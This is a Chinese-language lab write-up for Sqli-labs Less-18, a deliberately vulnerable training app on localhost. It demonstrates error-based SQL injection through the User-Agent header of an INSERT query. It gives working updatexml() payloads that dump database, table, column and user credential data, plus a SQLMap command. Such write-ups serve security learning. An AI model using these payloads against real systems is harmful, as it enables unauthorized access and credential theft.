---
title: Sqli-labs Less-18 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, HTTP头部注入, User-Agent, 报错注入]
---
## 一、 漏洞概述
- **关卡**：Less-18
- **漏洞类型**：基于报错的 HTTP 头部注入（Error-Based HTTP Header SQL Injection）
- **注入点**：HTTP 请求头中的 `User-Agent` 字段
- **闭合方式**：单引号 `'`
- **后端语句**：`INSERT INTO`

## 二、 渗透测试过程

### 1. 探测注入点与页面逻辑
访问 Less-18 关卡，页面依然是登录表单。尝试输入正确的用户名和密码（如 `admin` / `admin`），登录成功。
登录成功后，页面回显了当前用户的 `User-Agent` 和 `IP`。结合源码分析可知，后端在执行 `INSERT` 语句，将用户的 `User-Agent` 记录到了数据库表中。

由于 `uname` 和 `passwd` 参数在后台经过了 `check_input()` 严格过滤（转义了单引号），无法注入。我们的目标转移到未经过滤的 `User-Agent` 请求头。

### 2. 探测闭合方式与报错回显
开启 Burp Suite 拦截登录请求。将请求头中的 `User-Agent` 修改为带单引号的测试字符：
```http
User-Agent: 1'
```

放行请求后，页面直接返回了 SQL 语法报错：
You have an error in your SQL syntax... near ''1'', '127.0.0.1', 'admin')' at line 1。
由此确认：

1. User-Agent 存在单引号 ' 闭合的注入漏洞。
2. 后端语句结构大致为 INSERT INTO uagents (uagent, ip, username) VALUES ('$uagent', '$ip', '$uname')。
3. 页面有报错回显，由于是 INSERT 语句无法使用 UNION SELECT，因此采用报错注入。

### 3. 构造报错注入 Payload

利用 updatexml() 函数进行报错注入。因为是 INSERT 语句且有 3 个字段，我们需要在 Payload 中构造合法的闭合，将后续的 $ip 和 $uname 注释掉。

· 注入结构构造：
  将 User-Agent 设置为：1', updatexml(1,concat(0x7e,(select database())),1), 1) #
  拼接后的 SQL 变为：VALUES ('1', updatexml(1,concat(0x7e,(select database())),1), 1) #', '$ip', '$uname')。
  这样不仅闭合了引号，补齐了 3 个字段，还成功注释掉了多余代码。

### 4. 爆出数据

在 Burp Suite 中修改 User-Agent 字段，获取当前数据库名：

· Payload：
  ```http
  User-Agent: 1', updatexml(1,concat(0x7e,(select database())),1), 1) #
  ```
  结果：页面回显报错 XPATH syntax error: '~security'，成功爆出库名。
· 获取表名（需使用 limit 配合 offset 分段读取）：
  ```http
  User-Agent: 1', updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1), 1) #
  ```
· 获取用户名和密码（利用 substr 分段截取）：
  ```http
  User-Agent: 1', updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,32)),1), 1) #
  ```

## 三、 自动化利用 (SQLMap)

由于涉及到修改 HTTP Header，使用 SQLMap 需要通过 --headers 参数指定：

```bash
sqlmap -u "http://localhost/sqli-labs-master/Less-18/" --data="uname=admin&passwd=admin&submit=Submit" --headers="User-Agent: 1*" --batch --current-db
```

(注：在 User-Agent 中加上 * 号，是告诉 SQLMap 在此处进行注入测试。)

## 四、 通关 Payload 汇总

测试目的 Payload (修改 User-Agent 字段)
测试闭合 1'
获取库名 1', updatexml(1,concat(0x7e,(select database())),1), 1) #
获取表名 1', updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1), 1) #
获取字段名 1', updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),1), 1) #
